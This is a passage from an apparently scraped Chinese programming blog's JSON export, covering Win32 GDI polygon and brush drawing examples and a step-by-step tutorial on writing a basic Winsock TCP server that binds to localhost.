MyRegisterClass(HINSTANCE hInstance);BOOL InitInstance(HINSTANCE, int);LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);INT_PTR CALLBACK About(HWND, UINT, WPARAM, LPARAM);int APIENTRY wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPWSTR lpCmdLine, _In_ int nCmdShow)&#123; UNREFERENCED_PARAMETER(hPrevInstance); UNREFERENCED_PARAMETER(lpCmdLine); // TODO: 在此放置代码。 // 初始化全局字符串 LoadStringW(hInstance, IDS_APP_TITLE, szTitle, MAX_LOADSTRING); LoadStringW(hInstance, IDC_MY, szWindowClass, MAX_LOADSTRING); MyRegisterClass(hInstance); // 执行应用程序初始化: if (!InitInstance (hInstance, nCmdShow)) &#123; return FALSE; &#125; HACCEL hAccelTable = LoadAccelerators(hInstance, MAKEINTRESOURCE(IDC_MY)); MSG msg; // 主消息循环: while (GetMessage(&amp;msg, nullptr, 0, 0)) &#123; if (!TranslateAccelerator(msg.hwnd, hAccelTable, &amp;msg)) &#123; TranslateMessage(&amp;msg); DispatchMessage(&amp;msg); &#125; &#125; return (int) msg.wParam;&#125;//// 函数: MyRegisterClass()//// 目的: 注册窗口类。//ATOM MyRegisterClass(HINSTANCE hInstance)&#123; WNDCLASSEXW wcex; wcex.cbSize = sizeof(WNDCLASSEX); wcex.style = CS_HREDRAW | CS_VREDRAW; wcex.lpfnWndProc = WndProc; wcex.cbClsExtra = 0; wcex.cbWndExtra = 0; wcex.hInstance = hInstance; wcex.hIcon = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_MY)); wcex.hCursor = LoadCursor(nullptr, IDC_ARROW); wcex.hbrBackground = (HBRUSH)(COLOR_WINDOW+1); wcex.lpszMenuName = MAKEINTRESOURCEW(IDC_MY); wcex.lpszClassName = szWindowClass; wcex.hIconSm = LoadIcon(wcex.hInstance, MAKEINTRESOURCE(IDI_SMALL)); return RegisterClassExW(&amp;wcex);&#125;//// 函数: InitInstance(HINSTANCE, int)//// 目的: 保存实例句柄并创建主窗口//// 注释: //// 在此函数中，我们在全局变量中保存实例句柄并// 创建和显示主程序窗口。//BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)&#123; hInst = hInstance; // 将实例句柄存储在全局变量中 HWND hWnd = CreateWindowW(szWindowClass, szTitle, WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, 0, CW_USEDEFAULT, 0, nullptr, nullptr, hInstance, nullptr); if (!hWnd) &#123; return FALSE; &#125; ShowWindow(hWnd, nCmdShow); UpdateWindow(hWnd); return TRUE;&#125;//// 函数: WndProc(HWND, UINT, WPARAM, LPARAM)//// 目的: 处理主窗口的消息。//// WM_COMMAND - 处理应用程序菜单// WM_PAINT - 绘制主窗口// WM_DESTROY - 发送退出消息并返回////LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)&#123; POINT pt[4] = &#123; &#123;200,200&#125;, &#123;500,200&#125;, &#123;500,500&#125;, &#123;200,500&#125; &#125;; POINT pt2[8] = &#123; &#123; 200,200 &#125;, &#123; 500,200 &#125;, &#123; 500,500 &#125;, &#123; 200,500 &#125;, &#123;600,200&#125;, &#123;1000,200&#125;, &#123;1000,500&#125;, &#123;600,500&#125; &#125;; //多个多边形的顶点数 int pn[2] = &#123; 4,4 &#125;; switch (message) &#123; case WM_COMMAND: &#123; int wmId = LOWORD(wParam); // 分析菜单选择: switch (wmId) &#123; case IDM_ABOUT: DialogBox(hInst, MAKEINTRESOURCE(IDD_ABOUTBOX), hWnd, About); break; case IDM_EXIT: DestroyWindow(hWnd); break; default: return DefWindowProc(hWnd, message, wParam, lParam); &#125; &#125; break; case WM_PAINT: &#123; PAINTSTRUCT ps; HDC hdc = BeginPaint(hWnd, &amp;ps); // TODO: 在此处添加使用 hdc 的任何绘图代码... //多边形函数 //连接点,最后一个点会自动连接到第一个点 //Polygon(hdc,pt,4); PolyPolygon( hdc, //句柄 pt2, //多边形顶点数组 pn, //存储的是多边形顶点的个数,比如第一个多边形的顶点是4,第二个也是4 2 //多边形个数 ); EndPaint(hWnd, &amp;ps); &#125; break; case WM_DESTROY: PostQuitMessage(0); break; default: return DefWindowProc(hWnd, message, wParam, lParam); &#125; return 0;&#125;// “关于”框的消息处理程序。INT_PTR CALLBACK About(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)&#123; UNREFERENCED_PARAMETER(lParam); switch (message) &#123; case WM_INITDIALOG: return (INT_PTR)TRUE; case WM_COMMAND: if (LOWORD(wParam) == IDOK || LOWORD(wParam) == IDCANCEL) &#123; EndDialog(hDlg, LOWORD(wParam)); return (INT_PTR)TRUE; &#125; break; &#125; return (INT_PTR)FALSE;&#125;","categories":[{"name":"windows程序设计2","slug":"windows程序设计2","permalink":"https://xiaowuyoucy.github.io/categories/windows程序设计2/"}],"tags":[]},{"title":"画刷","slug":"pwcp016-画刷","date":"2021-06-12T16:25:11.000Z","updated":"2021-06-12T17:03:49.629Z","comments":true,"path":"2021/06/13/pwcp016-画刷/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/06/13/pwcp016-画刷/","excerpt":"","text":"画刷 备用画刷（stock brush） ​ 1.WHITE_BRUSH 白色画刷 LTGRAY_BRUSH 浅灰色画刷 3.GRAY_BRUSH 灰色画刷 4.DKGRAY_BRUSH 深灰色画刷 BLACK_BRUSH 黑色画刷 NULL_BRUSH 空画刷 创建颜色画刷 1HBRUSH CreateSolidBrush(COLORREF crColor); 1CreateSolidBrush(RGB(255,100,200)); 创建阴影画刷 1HBRUSH CreateHatchBrush(int fnStyle, COLORREF clrref)； fnStyle：指定刷子的阴影样式。该参数可以取下列值，这些值的含义为： HS_BDIAGONAL：表示45度向上，从左至右的阴影(/////)； HS_CROSS：水平和垂直交叉阴影(+++++)； HS_DIAGCROSS：45度交叉阴影(XXXXX)； HS_FDIAGONAL：45度向下，自左至右阴影(\\\\\\)； HS_HORIZONTAL：水平阴影(-----)； HS_VERTICAL：垂直阴影(|||||)。 cirref：指定用于阴影的刷子的前景色。 返回值：如果函数执行成功，那么返回值标识为逻辑刷子；如果函数执行失败，那么返回值为NULL。 1CreateHatchBrush(HS_VERTICAL, RGB(2, 202, 33)); HBRUSH类型 画刷句柄类型 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199// 画刷.cpp : 定义应用程序的入口点。//#include \"stdafx.h\"#include \"画刷.h\"#define MAX_LOADSTRING 100// 全局变量: HINSTANCE hInst; // 当前实例WCHAR szTitle[MAX_LOADSTRING]; // 标题栏文本WCHAR szWindowClass[MAX_LOADSTRING]; // 主窗口类名// 此代码模块中包含的函数的前向声明: ATOM MyRegisterClass(HINSTANCE hInstance);BOOL InitInstance(HINSTANCE, int);LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);INT_PTR CALLBACK About(HWND, UINT, WPARAM, LPARAM);int APIENTRY wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPWSTR lpCmdLine, _In_ int nCmdShow)&#123; UNREFERENCED_PARAMETER(hPrevInstance); UNREFERENCED_PARAMETER(lpCmdLine); // TODO: 在此放置代码。 // 初始化全局字符串 LoadStringW(hInstance, IDS_APP_TITLE, szTitle, MAX_LOADSTRING); LoadStringW(hInstance, IDC_MY, szWindowClass, MAX_LOADSTRING); MyRegisterClass(hInstance); // 执行应用程序初始化: if (!InitInstance (hInstance, nCmdShow)) &#123; return FALSE; &#125; HACCEL hAccelTable = LoadAccelerators(hInstance, MAKEINTRESOURCE(IDC_MY)); MSG msg; // 主消息循环: while (GetMessage(&amp;msg, nullptr, 0, 0)) &#123; if (!TranslateAccelerator(msg.hwnd, hAccelTable, &amp;msg)) &#123; TranslateMessage(&amp;msg); DispatchMessage(&amp;msg); &#125; &#125; return (int) msg.wParam;&#125;//// 函数: MyRegisterClass()//// 目的: 注册窗口类。//ATOM MyRegisterClass(HINSTANCE hInstance)&#123; WNDCLASSEXW wcex; wcex.cbSize = sizeof(WNDCLASSEX); wcex.style = CS_HREDRAW | CS_VREDRAW; wcex.lpfnWndProc = WndProc; wcex.cbClsExtra = 0; wcex.cbWndExtra = 0; wcex.hInstance = hInstance; wcex.hIcon = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_MY)); wcex.hCursor = LoadCursor(nullptr, IDC_ARROW); wcex.hbrBackground = (HBRUSH)(COLOR_WINDOW+1); wcex.lpszMenuName = MAKEINTRESOURCEW(IDC_MY); wcex.lpszClassName = szWindowClass; wcex.hIconSm = LoadIcon(wcex.hInstance, MAKEINTRESOURCE(IDI_SMALL)); return RegisterClassExW(&amp;wcex);&#125;//// 函数: InitInstance(HINSTANCE, int)//// 目的: 保存实例句柄并创建主窗口//// 注释: //// 在此函数中，我们在全局变量中保存实例句柄并// 创建和显示主程序窗口。//BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)&#123; hInst = hInstance; // 将实例句柄存储在全局变量中 HWND hWnd = CreateWindowW(szWindowClass, szTitle, WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, 0, CW_USEDEFAULT, 0, nullptr, nullptr, hInstance, nullptr); if (!hWnd) &#123; return FALSE; &#125; ShowWindow(hWnd, nCmdShow); UpdateWindow(hWnd); return TRUE;&#125;//// 函数: WndProc(HWND, UINT, WPARAM, LPARAM)//// 目的: 处理主窗口的消息。//// WM_COMMAND - 处理应用程序菜单// WM_PAINT - 绘制主窗口// WM_DESTROY - 发送退出消息并返回////LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)&#123; switch (message) &#123; case WM_COMMAND: &#123; int wmId = LOWORD(wParam); // 分析菜单选择: switch (wmId) &#123; case IDM_ABOUT: DialogBox(hInst, MAKEINTRESOURCE(IDD_ABOUTBOX), hWnd, About); break; case IDM_EXIT: DestroyWindow(hWnd); break; default: return DefWindowProc(hWnd, message, wParam, lParam); &#125; &#125; break; case WM_PAINT: &#123; PAINTSTRUCT ps; HBRUSH hBrush; HDC hdc = BeginPaint(hWnd, &amp;ps); SelectObject(hdc,CreatePen(PS_SOLID,5,RGB(255,0,0))); SelectObject(hdc, GetStockObject(GRAY_BRUSH)); Rectangle(hdc,100,100,200,200); hBrush = (HBRUSH)CreateHatchBrush(HS_HORIZONTAL, RGB(2, 202, 33)); SelectObject(hdc, hBrush); Rectangle(hdc, 250, 100, 350, 200); DeleteObject(SelectObject(hdc, CreateSolidBrush(RGB(255,100,200)))); Rectangle(hdc, 400, 100, 500, 200); DeleteObject(SelectObject(hdc, CreateHatchBrush(HS_BDIAGONAL, RGB(2, 202, 33)))); Rectangle(hdc, 550, 100, 650, 200); DeleteObject(SelectObject(hdc, CreateHatchBrush(HS_VERTICAL, RGB(2, 202, 33)))); Rectangle(hdc, 700, 100, 800, 200); DeleteObject(SelectObject(hdc, GetStockObject(WHITE_BRUSH))); DeleteObject(SelectObject(hdc, GetStockObject(WHITE_PEN))); // TODO: 在此处添加使用 hdc 的任何绘图代码... EndPaint(hWnd, &amp;ps); &#125; break; case WM_DESTROY: PostQuitMessage(0); break; default: return DefWindowProc(hWnd, message, wParam, lParam); &#125; return 0;&#125;// “关于”框的消息处理程序。INT_PTR CALLBACK About(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)&#123; UNREFERENCED_PARAMETER(lParam); switch (message) &#123; case WM_INITDIALOG: return (INT_PTR)TRUE; case WM_COMMAND: if (LOWORD(wParam) == IDOK || LOWORD(wParam) == IDCANCEL) &#123; EndDialog(hDlg, LOWORD(wParam)); return (INT_PTR)TRUE; &#125; break; &#125; return (INT_PTR)FALSE;&#125;","categories":[{"name":"windows程序设计2","slug":"windows程序设计2","permalink":"https://xiaowuyoucy.github.io/categories/windows程序设计2/"}],"tags":[]},{"title":"CS模型的TCP/IP协议","slug":"WS002CS模型的TCP-IP协议","date":"2021-06-08T14:48:18.000Z","updated":"2022-04-27T09:50:23.144Z","comments":true,"path":"2021/06/08/WS002CS模型的TCP-IP协议/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/06/08/WS002CS模型的TCP-IP协议/","excerpt":"","text":"CS模型的TCP/IP协议 创建服务端步骤 打开网络头文件 启动网络库 校验版本 创建SOCKET 绑定地址与端口 开始监听 接受连接 与客户端收发消息 网络头文件 网络库 12#include &lt;WinSock2.h&gt; #pragma comment(lib,“ws2_32.lib”) 目前网络库有哪些版本: 1.0 1.1 2.0 2.1 2.2 WSADATA结构 1234567891011121314151617typedef struct WSAData &#123; WORD wVersion; WORD wHighVersion;#ifdef _WIN64 unsigned short iMaxSockets; unsigned short iMaxUdpDg; char FAR * lpVendorInfo; char szDescription[WSADESCRIPTION_LEN+1]; char szSystemStatus[WSASYS_STATUS_LEN+1];#else char szDescription[WSADESCRIPTION_LEN+1]; char szSystemStatus[WSASYS_STATUS_LEN+1]; unsigned short iMaxSockets; unsigned short iMaxUdpDg; char FAR * lpVendorInfo;#endif&#125; WSADATA; wVersion Windows Sockets DLL期望调用者使用的Windows Sockets规范的版本。 高位字节存储副版本号, 低位字节存储主版本号，可以用WORD MAKEWORD(BYTE,BYTE ) 返回这个值,例如:MAKEWORD(1,1) wHighVersion 这个DLL能够支持的Windows Sockets规范的最高版本。通常它与wVersion相同。 szDescription 以null结尾的ASCII字符串，Windows Sockets DLL将对Windows Sockets实现的描述拷贝到这个字符串中，包括制造商标识。文本（最多可以有256个字符）可以包含任何字符，但是要注意不能包含控制字符和格式字符，应用程序对其最可能的使用方式是把它（可能被截断）显示在在状态信息中。 szSystemStatus 以null结尾的ASCII字符串，Windows Sockets DLL把有关的状态或配置信息拷贝到该字符串中。Windows Sockets DLL应当仅在这些信息对用户或支持人员有用时才使用它们，它不应被作为szDescription域的扩展。 iMaxSockets 单个进程能够打开的socket的最大数目。Windows Sockets的实现能提供一个全局的socket池，可以为任何进程分配；或者它也可以为socket分配属于进程的资源。这个数字能够很好地反映Windows Sockets DLL或网络软件的配置方式。应用程序的编写者可以通过这个数字来粗略地指明Windows Sockets的实现方式对应用程序是否有用。例如，X Windows服务器在第一次启动的时候可能会检查iMaxSockets的值：如果这个值小于8，应用程序将显示一条错误信息，指示用户重新配置网络软件（这是一种可能要使用szSystemStatus文本的场合）。显然无法保证某个应用程序能够真正分配iMaxSockets个socket，因为可能有其它WindowsSockets应用程序正在使用。 iMaxUdpDg Windows Sockets应用程序能够发送或接收的最大的用户数据包协议（UDP）的数据包大小，以字节为单位。如果实现方式没有限制，那么iMaxUdpDg为零。在Berkeley sockets的许多实现中，对于UDP数据包有个固有的限制（在必要时被分解），大小为8192字节。Windows Sockets的实现可以对碎片重组缓冲区的分配作出限制。对于适合的WindowsSockets 实现，iMaxUdpDg的最小值为512。注意不管iMaxUdpDg的值是什么，都不推荐你发回一个比网络的最大传送单元（MTU）还大的广播数据包。（Windows Sockets API 没有提供发现MTU的机制，但是它不会小于512个字节)。WinSock2.0版中已被废弃。 lpVendorInfo 指向销售商的数据结构的指针。这个结构的定义（如果有）超出了WindowsSockets规范的范围。WinSock2.0版中已被废弃。 WSAStartup打开网络库 1234int WSAStartup(WORD wVersionRequired,LPWSADATA lpWSAData); ⑴ wVersionRequested：一个WORD（双字节）型数值，在最高版本的Windows Sockets支持调用者使用，高阶字节指定小版本(修订本)号,低位字节指定主版本号。 ⑵lpWSAData 指向WSADATA数据结构的指针，用来接收Windows Sockets [1] 实现的细节。 WindowsSockets API提供的调用方可使用的最高版本号。高位字节指出副版本(修正)号，低位字节指明主版本号。 返回值: 0 成功。 否则返回下列的错误代码之一。注意通常依靠应用程序调用WSAGetLastError()机制获得的错误代码是不能使用的，因为Windows Sockets DLL可能没有建立“上一错误”信息储存的客户数据区域。 错误代码: WSASYSNOTREADY 代码数值为10091，指出网络通信依赖的网络子系统还没有准备好。 WSAVERNOTSUPPORTED 代码数值为10092，表示所需的Windows Sockets API的版本未由特定的Windows Sockets实现提供。 WSAEINVAL 代码数值为10022，说明应用程序指出的Windows Sockets版本不被该DLL支持。 WSAEINPROGRESS 代码数值为10036，说明一个阻塞的Winsock调用正在进行中。 WSAEPROCLIM 代码数值为10067，说明已经达到了Windows Sockets实现所支持的任务数量的极限。 WSAEFAULT 代码数值为10014，说明lpWSADATA参数是一个无效的指针。 1234567891011//MAKEWORD(主版本,副版本) 负责将2,2分配到wdVerSion低8位和高8位//wdVerSion低8位存储主版本,高8位存储副版本WORD wdVerSion = MAKEWORD(2, 2);WSADATA wdSockMsg;int nRes = WSAStartup(wdVerSion, &amp;wdSockMsg);if (0 != nRes)&#123; printf(&quot;WSAStartup Error %d\\n&quot;,nRes);&#125; 校验版本 12345678//校验网络库版本//HIBYTE取高8位,LOBYTE取高8位if (HIBYTE(wdSockMsg.wVersion) != 2 || LOBYTE(wdSockMsg.wVersion) != 2)&#123; //关闭网络库 WSACleanup(); return 0;&#125; 创建SOCKET套接字 1SOCKET PASCAL FAR socket( int af, int type, int protocol); 参数1 地址的类型 比如大家联系我 手机 15512345678 固定电话 7881234 ＱＱ 40916626xx 微信 c3_xin666 找上门 内蒙古 xxxxxxx … AF_INET 2 ipv4 Internet协议版本4（IPv4）地址系列。 192.168.1.103 0.0.0.0 ~ 255.255.255.255 点分十进制表示法 4字节 32位的地址 个数快不够 就是无符号int类型的范围 0 ~ 4294967295 AF_INET6 23 ipv6 Internet协议版本6（IPv6）地址系列。 2001:0:3238:DFE1:63::FEFB 16字节 128位的地址 这个地球每寸一个IP AF_BTH 32 蓝牙地址系列。 如果计算机安装了蓝牙适配器和驱动程序，则Windows XP SP2或更高版本支持此地址系列。 6B:2D:BC:A9:8C:12 AF_IRDA 26 红外数据协会（IrDA）地址系列。 仅当计算机安装了红外端口和驱动程序时，才支持此地址系列。 通信地址不仅仅只有IP地址 参数2 套接字类型 SOCK_STREAM 1 一种套接字类型，提供带有OOB数据传输机制的顺序，可靠，双向，基于连接的字节流。 此套接字类型使用传输控制协议（TCP）作为Internet地址系列（AF_INET或AF_INET6）。 SOCK_DGRAM 2 一种支持数据报的套接字类型，它是固定（通常很小）最大长度的无连接，不可靠的缓冲区。 此套接字类型使用用户数据报协议（UDP）作为Internet地址系列（AF_INET或AF_INET6）。 SOCK_RAW 3 一种套接字类型，提供允许应用程序操作下一个上层协议头的原始套接字。 要操作IPv4标头，必须在套接字上设置IP_HDRINCL套接字选项。 要操作IPv6标头，必须在套接字上设置IPV6_HDRINCL套接字选项。 SOCK_RDM 4 一种套接字类型，提供可靠的消息数据报。 这种类型的一个示例是Windows中的实用通用多播（PGM）多播协议实现，通常称为可靠多播节目。 仅在安装了可靠多播协议时才支持此类型值。 SOCK_SEQPACKET 5 一种套接字类型，提供基于数据报的伪流数据包。 参数3 协议的类型 IPPROTO_TCP 传输控制协议（TCP）。 当af参数为AF_INET或AF_INET6且类型参数为SOCK_STREAM时，这是一个可能的值。 IPPROTO_UDP 用户数据报协议（UDP）。 当af参数为AF_INET或AF_INET6且类型参数为SOCK_DGRAM时，这是一个可能的值。 IPPROTO_ICMP Internet控制消息协议（ICMP）。 当af参数为AF_UNSPEC，AF_INET或AF_INET6且类型参数为SOCK_RAW或未指定时，这是一个可能的值。 IPPROTO_IGMP Internet组管理协议（IGMP）。 当af参数为AF_UNSPEC，AF_INET或AF_INET6且类型参数为SOCK_RAW或未指定时，这是一个可能的值。 IPPROTO_RM 用于可靠多播的PGM协议。 当af参数为AF_INET且类型参数为SOCK_RDM时，这是一个可能的值。 在针对Windows Vista及更高版本发布的Windows SDK上，此协议也称为IPPROTO_PGM。 仅在安装了可靠多播协议时才支持此协议值。 整理下 通过参数3得到一个事儿，参数1 2 3三者是配套的，是一套参数，不是随便填的，即使用不同的协议，那要添加对应的那套参数。 想要使用一个协议，咱们设备得支持才行，比如红外 参数3中，有个可能这个词，所以说一般，参数3可以填写0，系统会自动帮我们选择协议类型 返回值 成功返回可用的socket 不用了就一定要销毁套接字 closesocket(socketListen); 失败返回INVALID_SOCKET 关闭网络库 WSACleanup(); 可用WSAGetLasterror()返回错误码 12345678SOCKET sock = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);//如果创建套接字失败if (INVALID_SOCKET == sock)&#123; printf(\"socket Error: %d\\n\",WSAGetLastError()); //关闭网络库 WSACleanup();&#125; 绑定地址与端口 给我们的socket绑定端口号与具体地址 1int PASCAL FAR bind( SOCKET sockaddr, const struct sockaddr FAR* my_addr,int addrlen); 参数1 上一个函数创建了socket，绑定了协议信息（地址类型，套接字类型，协议类型），咱们bind函数就是绑定实质的地址，端口号 参数2 12345sockaddr_in sockAddress;sockAddress.sin_family = AF_INET; //地址类型sockAddress.sin_addr.s_addr = inet_addr(&quot;127.0.0.1&quot;); //服务器ip地址sockAddress.sin_port = 12345; //服务器端口号(sockaddr*)&amp;sockAddress强转添加到参数2上 参数3 参数2的类型大小 sizeof(sockAddress) 返回值 成功返回0 失败返回SOCKET_ERROR 具体错误码通过int WSAGetLastError(void);获得 closesocket(socketListen); WSACleanup(); htons htons的功能：将一个无符号短整型的主机数值转换为网络字节顺序，即大尾顺序(big-endian) 1u_short htons(u_short hostshort); 而我们常用的 x86 CPU (intel, AMD) 电脑是 little-endian,也就是整数的低位字节放在内存的低字节处。举个例子吧。假定你的数据是0x1234, 在网络字节顺序里 这个数据放到内存中就应该显示成 addr addr+1 0x12 0x34 而在x86电脑上，数据0x1234放到内存中实际是： addr addr+1 0x34 0x12 htons 的用处就是把实际主机内存中的整数存放方式调整成网络字节顺序。 inet_addr inet_addr是一个计算机函数，功能是将一个点分十进制的IP转换成一个长整数型数（u_long类型）等同于inet_addr()。 1in_addr_t inet_addr(const char* strptr); 1daddr.s_addr=inet_addr(&quot;192.168.1.60&quot;); inet_ntoa 功能是将网络地址转换成“.”点隔的字符串格式。 网络字节序IP转化点分十进制IP 1char *inet_ntoa (struct in_addr); 1234567891011121314151617struct sockaddr_in si; //地址类型 si.sin_family = AF_INET; //端口 si.sin_port = htons(12345); //地址 si.sin_addr.S_un.S_addr = inet_addr(&quot;127.0.0.1&quot;); if (SOCKET_ERROR == bind(sock, (const struct sockaddr *)&amp;si, sizeof(si))) &#123; printf(&quot;bind Error: %d\\n&quot;, WSAGetLastError()); //关闭套接字 closesocket(sock); //关闭网络库 WSACleanup(); return 0; &#125; 开始监听 将套接字置于正在侦听传入连接的状态。 1234int WSAAPI listen( SOCKET s, int backlog); 参数1 ​ 服务器端的socket，也就是socket函数创建的 参数2 ​ 挂起连接队列的最大长度。 ​ 我们一般填写这个参数 ​ SOMAXCONN ​ 作用是让系统自动选择最合适的个数 ​ 不同的系统环境不一样，所以这个合适的数也都不一样 返回值 成功 ​ 返回0 失败 ​ SOCKET_ERROR ​ 具体错误码 ​ WSAGetLastError() ​ 释放 ​ closesocket(socketListen); ​ WSACleanup(); 123456789//开始监听 if (SOCKET_ERROR == listen(sock, SOMAXCONN)) &#123; printf(&quot;listen Error: %d\\n&quot;, WSAGetLastError()); //关闭套接字 closesocket(sock); //关闭网络库 WSACleanup(); return 0; &#125; 创建客户端socket/接受连接 作用 accept函数允许在套接字上进行传入连接尝试。 listen监听客户端来的链接，accept讲客户端的信息绑定到一个socket上，也就是给客户端创建一个socket,通过返回值返回给我们客户端的socket 一次只能创建一个，有几个客户端链接，就要调用几次 12345SOCKET WSAAPI accept( SOCKET s, //服务端socket sockaddr *addr, //用来接收客户端地址和端口 int *addrlen //参数2的长度); 这个函数是阻塞的 参数2,参数3可以设置为NULL,不得到客户端信息,可以调用getpeername函数得到客户端信息 返回值 成功 ​ 返回值就是给客户端包好的socket,与客户端通信就靠这个 失败 ​ 返回INVALID_SOCKET ,用WSAGetLastError()得到错误码 ​ 释放空间 ​ closesocket(socketListen); ​ WSACleanup(); 123456789101112struct sockaddr_in sockClientAddr; int len = sizeof(sockClientAddr); printf(&quot;等待连接...\\n&quot;); SOCKET sockClient = accept(sock, (struct sockaddr *)&amp;sockClientAddr,&amp;len); if (sockClient == INVALID_SOCKET) &#123; printf(&quot;accept Error: %d\\n&quot;, WSAGetLastError()); //关闭套接字 closesocket(sock); //关闭网络库 WSACleanup(); &#125; 通过getpeername函数得到客户端信息 1getpeername(newSocket, (struct sockaddr*)&amp;sockClient, &amp;nLen); getsockname函数得到本地服务器信息 1getsockname(sSocket, (sockaddr*)&amp;addr, &amp;nLen); 与客户端收发消息 recv收消息 数据的接收都是由协议本身做的，也就是socket的底层做的，系统会有一段缓冲区，存储着接收到的数据。 咱们外边调用recv的作用，就是通过socket找到这个缓冲区，并把数据复制进咱们的参数2，复制参数3个 123456int recv( SOCKET s, //客户端socket char *buf, //缓冲区 int len, //缓冲区大小 int flags //正常写0,表示读完就删除); 参数1 ​ 客户端的socket，每个客户端对应唯一的socket 参数2 ​ 客户端消息的存储空间，也就是个字符数组 ​ 这个一般1500字节 ​ 网络传输得最大单元，1500字节，也就是客户端发过来得数据，一次最大就是1500字节，这是协议规定，这个数值也是根据很多情况，总结出来得最优值 ​ 所以客户端最多一组来1500字节，咱们这头1500读一次，够够的了。 参数3 ​ 想要读取得字节个数 ​ 一般是参数2得字节数-1，把\\0字符串结尾留出来 参数4 一般填0,表示读完就删 MSG_PEEK ​ 窥视传入的数据。 数据将复制到缓冲区中，但不会从输入队列中删除。 ​ 读出来的不删除 ​ 这个东西是不建议被使用的 ​ 第一、读数据不行 ​ 第二、那就无法计数了 MSG_OOB ​ 带外数据 ​ 意义 ​ 就是传输一段数据，在外带一个额外的特殊数据 ​ 相当于小声BB ​ 实际 ​ 就不建议被使用了 ​ 1、TCP协议规范（RFC 793）中OOB的原始描述被“主机要求”规范取代（ RFC 1122），但仍有许多机器具有RFC 793 OOB实现。 ​ 2、既然两种数据，那咱们就send两次，另一方recv两次就行了，何必搞得那么神神秘秘，浪费计算机精力 MSG_WAITALL ​ 直到系统缓冲区字节数满足参数3所请求得字节数，才开始读取 返回值 成功 ​ 返回0 失败 ​ SOCKET_ERROR ​ 具体错误码 ​ WSAGetLastError() ​ 释放 ​ closesocket(socketListen); ​ WSACleanup(); send发送消息 向目标发送数据 本质 send函数将我们的数据复制黏贴进系统的协议发送缓冲区，计算机伺机发出去 最大传输单元是1500字节 123456int WSAAPI send( SOCKET s, //客户端socket const char *buf, //发送缓冲区 int len, //发送长度 int flags //一般写0); 参数1 ​ 目标的socket，每个客户端对应唯一的socket 参数2 ​ 给对方发送的字节串 ​ 这个不要超过1500字节 ​ 发送时候，协议要进行包装，加上协议信息，也叫协议头，或者叫包头，咱们在理论部分，会非常详细的介绍协议头，以及功能 ​ 这个大小不同的协议不一样，链路层14字节，ip头20字节，tcp头20字节，数据结尾还要有状态确认，加起来也几十个字节，所以实际咱们的数据位，不能写1500个，要留出来，那就1024吧，或者最多1400，就差不多了 ​ 懂这个大体原理就好 ​ ​ 当然大家这个不一定每次都是正好那么多字节，比如聊天，一句话就十个八个的汉字，别多于1400是最好的 ​ 超过1500系统咋办？ ​ 系统会分片处理 ​ 比如2000个字节 ​ 系统分成两个包 ​ 1400 + 包头 == 1500 假设包头100字节 600 + 包头 == 700 ​ 分两次发送出去 ​ 结果 ​ 1、系统要给咱们分包再打包，再发送， 客户端接收到了还得拆包，组合数据。从而增加了系统的工作，降低效率 ​ 2、有的协议，就把分片后的二包直接丢了 参数3 ​ 字节个数 ​ 1400 参数4 ​ 写0就行了 ​ 其他 ​ MSG_OOB ​ 意义同recv ​ 就不用使用了 ​ 带外数据 ​ 意义 ​ 就是传输一段数据，在外带一个额外的特殊数据 ​ 相当于小声BB ​ 实际 ​ 就不建议被使用了 ​ 1、TCP协议规范（RFC 793）中OOB的原始描述被“主机要求”规范取代（ RFC 1122），但仍有许多机器具有RFC 793 OOB实现。 ​ 2、既然两种数据，那咱们就send两次，另一方recv两次就行了，何必搞得那么神神秘秘，浪费计算机精力 ​ MSG_DONTROUTE ​ 指定数据不应受路由限制。 Windows套接字服务提供程序可以选择忽略此标志。 返回值 成功 返回写入的字节数 执行失败 返回SOCKET_ERROR WSAGetLastError()得到错误码 根据错误码信息做相应处理 重启 等待 不用理会 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;WinSock2.h&gt;#pragma comment(lib,\"Ws2_32.lib\")//标记BOOL g_nFlag = TRUE;int main(void)&#123; //打开网络库 WORD wdVersion = MAKEWORD(1,1); WSADATA wsaData; //int a = WSAStartup(wdVersion, &amp;wsaData); //printf(\"外%d\\n\", WSAStartup(wdVersion, &amp;wsaData)); if (0 != WSAStartup(wdVersion,&amp;wsaData)) // API &#123; printf (\"WSAStartup fail!\"); return -1; &#125; //校验版本 if (1 != HIBYTE(wsaData.wVersion) || 1 != LOBYTE(wsaData.wVersion)) &#123; printf(\"Version fail!\" ); //关闭库 WSACleanup(); return -1; &#125; //创建一个SOCKET 监听 SOCKET socketListen = socket(AF_INET,SOCK_STREAM,0); if (INVALID_SOCKET == socketListen) &#123; printf(\"socket fail!\"); //关闭库 WSACleanup(); return -1; &#125; //绑定地址 SOCKADDR_IN sockAddress; sockAddress.sin_family = AF_INET; sockAddress.sin_addr.s_addr = inet_addr(\"127.0.0.1\"); sockAddress.sin_port = htons(12345); if (SOCKET_ERROR == bind(socketListen,(struct sockaddr*)&amp;sockAddress,sizeof(sockAddress))) &#123; printf(\"bind fail!\"); //int nError = 